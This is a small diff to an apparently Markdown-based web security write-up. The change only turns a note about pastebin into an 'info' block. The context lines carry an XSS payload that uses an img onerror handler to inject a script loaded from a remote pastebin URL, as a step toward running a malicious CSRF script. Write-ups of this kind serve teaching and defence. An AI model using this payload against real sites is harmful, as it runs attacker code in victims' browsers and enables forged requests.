@@ -402,7 +402,9 @@ No problem, we can load script via `img` `onerror` event:
 <img src=x onerror='var s=document.createElement(`script`);s.src=`https://pastebin.com/raw/KN1TVRkr`;document.body.appendChild(s)'>
 ```
 
-> **Note**: `pastebin` won't work, more info later.
+::: info Note
+`pastebin` won't work, more info later.
+:::
 
 Now we need a malicious CSRF script to do the heavy work.
 
